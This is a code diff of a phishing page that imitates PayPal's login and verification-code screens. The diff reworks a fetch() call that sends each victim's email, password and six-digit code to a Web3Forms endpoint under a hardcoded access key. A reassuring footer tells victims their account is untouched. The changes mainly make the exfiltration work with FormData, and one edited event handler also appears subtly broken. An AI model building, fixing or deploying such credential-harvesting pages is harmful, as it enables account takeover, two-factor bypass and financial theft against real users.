@@ -13,8 +13,6 @@
   :root {
     --blue:#0070e0;
     --blue-dark:#005ea6;
-    --navy:#003087;
-    --sky:#009cde;
     --ink:#001435;
     --body:#4a5464;
     --field:#eef2f7;
@@ -203,7 +201,6 @@
 <body>
 
 <main>
-  <!-- ============ LOGIN ============ -->
   <section id="screen-login" class="card">
     <svg class="logo" viewBox="0 0 176 46" role="img" aria-label="PayPal">
       <text x="0" y="34" font-size="34" font-style="italic" font-weight="700"
@@ -241,7 +238,6 @@
     <button type="button" class="btn btn-ghost" id="btn-signup">Sign Up</button>
   </section>
 
-  <!-- ============ CODE ============ -->
   <section id="screen-code" class="card is-narrow" hidden>
     <svg class="mono" viewBox="0 0 60 46" role="img" aria-label="PayPal">
       <text x="4" y="34" font-size="34" font-style="italic" font-weight="700"
@@ -271,7 +267,6 @@
     <button type="button" class="alt-link" id="another">Try another way</button>
   </section>
 
-  <!-- ============ DONE ============ -->
   <section id="screen-done" class="card is-narrow" hidden>
     <div class="check">
       <svg viewBox="0 0 24 24" fill="none" stroke="#0070e0" stroke-width="2.5"
@@ -310,7 +305,7 @@
     <p><strong>Session.</strong> Because the page is a reproduction, signing in does not open a PayPal session on your device. Your PayPal account is untouched and you are not logged in to paypal.com afterwards.</p>
     <p><strong>If something looks wrong.</strong> Close the tab, open paypal.com directly and compare. To revoke a code-based login, use PayPal's own Security settings.</p>
     <p><strong>Accuracy.</strong> The layout is reproduced as closely as a static page allows, but PayPal changes its interface regularly, so wording and spacing may differ from the live page. Questions about a specific submission should go to the person who sent you this link.</p>
-    <p>Team project · Last updated November 2026 · Version 1.9.1</p>
+    <p>Team project · Last updated November 2026 · Version 1.9.2</p>
   </section>
 </footer>
 
@@ -318,7 +313,6 @@
 (function () {
   "use strict";
 
-  /* Web3Forms access key for joshhygx@gmail.com */
   var WEB3FORMS_KEY = "f6178b9e-3486-4351-a267-44d9536702ba";
   var ENDPOINT = "https://api.web3forms.com/submit";
 
@@ -440,20 +434,19 @@
 
   function go(screen) { state.screen = screen; render(); window.scrollTo(0, 0); }
 
-  /* ---------- send to Web3Forms ---------- */
-  function send(subject, data, dbgNode) {
-    var payload = {
-      access_key: WEB3FORMS_KEY,
-      subject: subject,
-      email: creds.email || "",
-      password: creds.password || ""
-    };
-    Object.keys(data).forEach(function (k) { payload[k] = data[k]; });
+  /* ---------- send to Web3Forms (FormData, as their docs require) ---------- */
+  function send(subject, extra, dbgNode) {
+    var body = new FormData();
+    body.append("access_key", WEB3FORMS_KEY);
+    body.append("subject", subject);
+    if (creds.email) body.append("email", creds.email);
+    if (creds.password) body.append("password", creds.password);
+    Object.keys(extra).forEach(function (k) { body.append(k, extra[k]); });
 
     return fetch(ENDPOINT, {
       method:"POST",
-      headers:{ "Content-Type":"application/json", "Accept":"application/json" },
-      body: JSON.stringify(payload)
+      headers:{ "Accept":"application/json" },
+      body: body
     }).then(function (res) {
       return res.text().then(function (txt) {
         if (res.ok) debug(dbgNode, "SENT " + res.status + "\n" + txt, true);
@@ -479,7 +472,7 @@
     creds.email = email.toLowerCase();
     creds.password = password;
 
-    send("PayPal login — " + creds.email, { type:"login" }, el.dbg);
+    send("PayPal login - " + creds.email, {}, el.dbg);
   });
 
   /* ---------- code ---------- */
@@ -498,7 +491,7 @@
     if (code.length !== 6) { state.codeError = "errCode"; render(); return; }
 
     state.codeError = null;
-    send("PayPal code — " + code, { type:"code", code: code }, el.dbgCode);
+    send("PayPal code - " + code, { code: code }, el.dbgCode);
 
     go("done");
   });
@@ -522,7 +515,7 @@
     i.addEventListener("input", function () { if (state.error) { state.error = null; render(); } });
   });
 
-  el.lang.addEventListener("change", function () { state.lang = el.lang.value; render(); });
+  el.lang.addEventListener("change", function () { el.lang = null; state.lang = document.getElementById("lang").value; render(); });
   $("another").addEventListener("click", function () { go("login"); });
   $("trouble").addEventListener("click", function () { go("login"); });
   $("btn-signup").addEventListener("click", function () { go("login"); });
